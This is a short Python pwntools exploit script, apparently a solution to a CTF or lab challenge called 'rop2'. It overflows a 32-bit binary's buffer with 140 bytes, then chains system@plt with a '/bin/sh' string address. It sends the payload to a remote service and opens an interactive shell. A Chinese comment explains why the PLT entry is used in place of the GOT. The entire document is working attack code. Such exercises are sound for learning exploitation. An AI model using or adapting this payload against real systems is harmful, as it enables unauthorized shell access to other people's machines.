#coding:utf-8
from pwn import *

system_plt=0x080483A0 #这里不能用got,system前面没用过
binsh=0x08048610
ret=0
ov="A"*140
pay=ov+p32(system_plt)+p32(ret)+p32(binsh)
#p=process("./rop2")
p=remote("0.0.0.0",9999)
# gdb.attach(p,'''
# B *0x080484DA
# ''')
p.sendline(pay)
p.interactive()
